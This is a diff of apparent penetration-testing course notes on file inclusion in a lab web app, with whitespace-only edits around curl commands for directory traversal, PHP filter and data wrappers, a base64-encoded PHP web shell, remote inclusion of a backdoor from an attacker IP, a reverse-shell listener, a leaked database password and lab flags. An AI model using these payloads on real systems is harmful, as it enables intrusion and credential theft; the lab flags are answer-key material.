@@ -566,10 +566,12 @@ OS{8267caf26dc5b6bb3876c10b9d8c28ef}
     
 - ```
     Explore PHP wrapper usage 
+
     ```
     
 </code></pre>
 <pre><code>Learn how to perform Remote File Inclusion (RFI) attacks 
+
 ```
 </code></pre>
 <h4>Local File Inclusion (LFI)</h4>
@@ -609,7 +611,8 @@ OS{8267caf26dc5b6bb3876c10b9d8c28ef}
 </ul>
 </li>
 </ul>
-<pre><code class="language-bash">kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
+<pre><code class="language-bash">
+kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
 ...
 192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] &quot;GET /meteor/index.php?page=admin.php HTTP/1.1&quot; 200 2218 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;
 </code></pre>
@@ -723,7 +726,8 @@ OS{8267caf26dc5b6bb3876c10b9d8c28ef}
 </ul>
 </li>
 </ul>
-<pre><code>### In Burp, sent req from HTTP hist to Repeater, OG req snip with admin page inclusion
+<pre><code>
+### In Burp, sent req from HTTP hist to Repeater, OG req snip with admin page inclusion
 ...
 &lt;body&gt;
         &lt;span style=&quot;color:#F00;text-align:center;&quot;&gt;The admin page is currently under maintenance.
@@ -829,7 +833,8 @@ OS{965fc8eb26256c952045acd438d25619}
 <ul>
 <li>DT with explicit path/rel path below.</li>
 </ul>
-<pre><code>### Exp
+<pre><code>
+### Exp
 
 GET /meteor/index.php?page=/opt/admin.bak.php HTTP/1.1
 Host: mountaindesserts.com
@@ -873,7 +878,8 @@ Connection: close
 </ul>
 </li>
 </ul>
-<pre><code>### Check access.log 
+<pre><code>
+### Check access.log 
 
 ┌──(kali㉿kali)-[~]
 └─$ urlencode &#39;C:\xampp\apache\logs\access.log&#39;
@@ -970,7 +976,8 @@ OS{14b069b2a4b837e64c31d95d1da76910}
 </li>
 </ul>
 <p><strong>filter example</strong></p>
-<pre><code class="language-bash">kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
+<pre><code class="language-bash">
+kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
 ...
 &lt;a href=&quot;index.php?page=admin.php&quot;&gt;&lt;p style=&quot;text-align:center&quot;&gt;Admin&lt;/p&gt;&lt;/a&gt;
 &lt;!DOCTYPE html&gt;
@@ -985,7 +992,8 @@ OS{14b069b2a4b837e64c31d95d1da76910}
 </code></pre>
 <p>Note, body is not closed!!! We can assume exec code, such as php, follows.</p>
 <p>Include with filter.</p>
-<pre><code class="language-bash">kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
+<pre><code class="language-bash">
+kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
 ...
 &lt;a href=&quot;index.php?page=admin.php&quot;&gt;&lt;p style=&quot;text-align:center&quot;&gt;Admin&lt;/p&gt;&lt;/a&gt;
 &lt;!DOCTYPE html&gt;
@@ -999,7 +1007,8 @@ OS{14b069b2a4b837e64c31d95d1da76910}
         &lt;span style=&quot;color:#F00;text-align:center;&quot;&gt;The admin page is currently under maintenance.
 </code></pre>
 <p>Same result as PHP is still executing, encode to base64 string to extract.</p>
-<pre><code class="language-bash">kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+<pre><code class="language-bash">
+kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
 ...
 &lt;a href=&quot;index.php?page=admin.php&quot;&gt;&lt;p style=&quot;text-align:center&quot;&gt;Admin&lt;/p&gt;&lt;/a&gt;
 PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
@@ -1007,7 +1016,8 @@ dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRt
 ...
 </code></pre>
 <p>Copy string from output and decode in terminal.</p>
-<pre><code class="language-bash">kali@kali:~$ echo &quot;PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K&quot; | base64 -d
+<pre><code class="language-bash">
+kali@kali:~$ echo &quot;PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K&quot; | base64 -d
 &lt;!DOCTYPE html&gt;
 &lt;html lang=&quot;en&quot;&gt;
 &lt;head&gt;
@@ -1029,7 +1039,8 @@ $conn = new mysqli($servername, $username, $password);
 </code></pre>
 <p>Decoded data contains MySQL conn info!!!</p>
 <p><strong>data example</strong></p>
-<pre><code class="language-bash">kali@kali:~$ curl &quot;http://mountaindesserts.com/meteor/index.php?page=data://text/plain,&lt;?php%20echo%20system(&#39;ls&#39;);?&gt;&quot;
+<pre><code class="language-bash">
+kali@kali:~$ curl &quot;http://mountaindesserts.com/meteor/index.php?page=data://text/plain,&lt;?php%20echo%20system(&#39;ls&#39;);?&gt;&quot;
 ...
 &lt;a href=&quot;index.php?page=admin.php&quot;&gt;&lt;p style=&quot;text-align:center&quot;&gt;Admin&lt;/p&gt;&lt;/a&gt;
 admin.php
@@ -1043,7 +1054,8 @@ js
 </code></pre>
 <p>PHP snip with data wrapper shows output of <code>ls</code>.</p>
 <p>When web application firewalls or other security mechanisms are in place, they may filter strings like &quot;system&quot; or other PHP code elements. In such a scenario, we can try to use the data:// wrapper with base64-encoded data. We&#39;ll first encode the PHP snippet into base64, then use curl to embed and execute it via the data:// wrapper.</p>
-<pre><code class="language-bash">kali@kali:~$ echo -n &#39;&lt;?php echo system($_GET[&quot;cmd&quot;]);?&gt;&#39; | base64
+<pre><code class="language-bash">
+kali@kali:~$ echo -n &#39;&lt;?php echo system($_GET[&quot;cmd&quot;]);?&gt;&#39; | base64
 PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
 
 
@@ -1063,7 +1075,8 @@ start.sh
 <p>Listing 25 shows that we successfully achieved code execution with the base64-encoded PHP snippet. This is a handy technique that may help us bypass basic filters. However, we need to be aware that the data:// wrapper will not work in a default PHP installation. To exploit it, the <a href="https://www.php.net/manual/en/filesystem.configuration.php">allow_url_include</a> setting needs to be enabled.</p>
 <h4>PHP Wrapper Exercises</h4>
 <p>Exploit the Local File Inclusion vulnerability on WEB18 (VM #1) by using the php://filter with base64 encoding to include the contents of the /var/www/html/backup.php file with Burp or curl. Copy the output, decode it, and find the flag.</p>
-<pre><code>### Test filter and base64 encode on admin.php
+<pre><code>
+### Test filter and base64 encode on admin.php
 
 GET /meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php HTTP/1.1
 Host: mountaindesserts.com
@@ -1184,7 +1197,8 @@ system(&quot;sudo rsync -avzR /var/www/html/index.php /mnt/external/&quot;);
 &lt;/html&gt;
 </code></pre>
 <p>Follow the steps above and use the data:// PHP Wrapper in combination with the URL encoded PHP snippet we used in this section to execute the uname -a command on WEB18 (VM #1). Enter the Linux kernel version as answer.</p>
-<pre><code class="language-http">GET /meteor/index.php?page=data://text/plain,&lt;?php%20echo%20system(&#39;uname%20-a&#39;);?&gt; HTTP/1.1
+<pre><code class="language-http">
+GET /meteor/index.php?page=data://text/plain,&lt;?php%20echo%20system(&#39;uname%20-a&#39;);?&gt; HTTP/1.1
 Host: mountaindesserts.com
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
@@ -1227,7 +1241,8 @@ Linux 3b51a43fad24 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 202
 </ul>
 </li>
 </ul>
-<pre><code class="language-bash">kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
+<pre><code class="language-bash">
+kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
 ...
 &lt;?php
 if(isset($_REQUEST[&#39;cmd&#39;])){
@@ -1243,12 +1258,14 @@ Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
 ...
 </code></pre>
 <p>To leverage an RFI vulnerability, we need to make the remote file accessible by the target system.</p>
-<pre><code class="language-bash">kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
+<pre><code class="language-bash">
+kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 </code></pre>
 <p>We could also use a publicly-accessible file, such as one from Github.</p>
 <p>Next, we&#39;ll use curl to include the hosted file via HTTP and specify ls as our command.</p>
-<pre><code class="language-bash">kali@kali:/usr/share/webshells/php/$ curl &quot;http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&amp;cmd=ls&quot;
+<pre><code class="language-bash">
+kali@kali:/usr/share/webshells/php/$ curl &quot;http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&amp;cmd=ls&quot;
 ...
 &lt;a href=&quot;index.php?page=admin.php&quot;&gt;&lt;p style=&quot;text-align:center&quot;&gt;Admin&lt;/p&gt;&lt;/a&gt;
 &lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt; 
@@ -1264,7 +1281,8 @@ js
 </code></pre>
 <h4>Remote File Inclusion (RFI) Exercises</h4>
 <p>Follow the steps from this section to leverage RFI to remotely include the /usr/share/webshells/php/simple-backdoor.php PHP file. Use the &quot;cmd&quot; parameter to execute commands on VM #1 and use the cat command to view the contents of the authorized_keys file in the /home/elaine/.ssh/ directory. The file contains one entry including a restriction for allowed commands. Find the flag specified as the value to the command parameter in this file.</p>
-<pre><code class="language-bash">└─$ curl &quot;http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.198/simple-backdoor.php&amp;cmd=ls&quot;
+<pre><code class="language-bash">
+└─$ curl &quot;http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.198/simple-backdoor.php&amp;cmd=ls&quot;
 
 ...
 &lt;a href=&quot;index.php?page=admin.php&quot;&gt;&lt;p style=&quot;text-align:center&quot;&gt;Admin&lt;/p&gt;&lt;/a&gt;
@@ -1331,7 +1349,8 @@ cat%20..%2F..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Felaine%2F.ssh%2Fauthorized_keys
 ...
 </code></pre>
 <p>Instead of including the /usr/share/webshells/php/simple-backdoor.php webshell, include the PHP reverse shell from Pentestmonkey&#39;s Github repository. Change the $ip variable to the IP of your Kali machine and $port to 4444. Start a Netcat listener on port 4444 on your Kali machine and exploit the RFI vulnerability on VM #2 to include the PHP reverse shell. Find the flag in the /home/guybrush/.treasure/flag.txt file.</p>
-<pre><code>### Netcat listener
+<pre><code>
+### Netcat listener
 
 $ nc -nvlp 444
 
@@ -1387,11 +1406,14 @@ $ sudo cat /home/guybrush/.treasure/flag.txt
 OS{60430fabfa02aa752791194b9591be5e}
 </code></pre>
 <h3>9.2 File Upload Vulnerabilities</h3>
-<pre><code>    Understand File Upload vulnerabilities 
+<pre><code>
+    Understand File Upload vulnerabilities 
+
     ```
     
 </code></pre>
 <pre><code>Learn how to identify File Upload vulnerabilities 
+
 ```
 </code></pre>
 <ul>
